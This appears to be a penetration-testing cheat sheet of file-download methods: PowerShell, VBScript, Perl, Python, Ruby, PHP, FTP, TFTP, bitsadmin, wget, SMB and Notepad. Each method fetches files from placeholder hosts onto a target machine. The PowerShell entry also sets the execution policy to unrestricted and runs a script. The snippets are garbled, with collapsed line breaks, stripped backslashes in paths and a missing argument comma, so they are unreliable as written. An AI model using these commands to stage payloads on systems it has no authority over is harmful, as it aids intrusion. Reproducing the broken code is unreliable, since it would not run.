## Powershell

```
$p = New-Object System.Net.WebClient $p.DownloadFile("http://domain/file" "C:%homepath%file") 
```

```
powershell set-executionpolicy unrestricted
PS C:> .test.ps1
```

## Visual Basic

```
Set args = Wscript.Arguments Url = "http://domain/file" dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: Set bStrm = createobject("Adodb.Stream") xHttp.Open "GET", Url, False xHttp.Send with bStrm     .type = 1 '     .open     .write xHttp.responseBody     .savetofile " C:%homepath%file", 2 ' end with
```

```
cscript test.vbs
```

## Perl

```
#!/usr/bin/perl use LWP::Simple; getstore("http://domain/file", "file");
```

## Python

```
#!/usr/bin/python import urllib2 u = urllib2.urlopen('http://domain/file') localFile = open('local_file', 'w') localFile.write(u.read()) localFile.close()
```

## Ruby

```
#!/usr/bin/ruby require 'net/http' Net::HTTP.start("www.domain.com") { |http| r = http.get("/file") open("save_location", "wb") { |file| file.write(r.body) } }
```

## PHP 

```
#!/usr/bin/php <?php         $data = @file("http://example.com/file");         $lf = "local_file";         $fh = fopen($lf, 'w');         fwrite($fh, $data[0]);         fclose($fh); ?>
```

## FTP

```
ftp 127.0.0.1 username password get file exit
```

## TFTP

```
tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
```

## Bitsadmin

```
bitsadmin /transfer n http://domain/file c:%homepath%file
```

## Wget

```
wget http://example.com/file
```

## SMB

```
net use x: \127.0.0.1share /user:example.comuserID myPassword
```

## Notepad 

- Open notepad
- Go to file – open
- In the File Name box near the bottom, type in the full URL path to your file

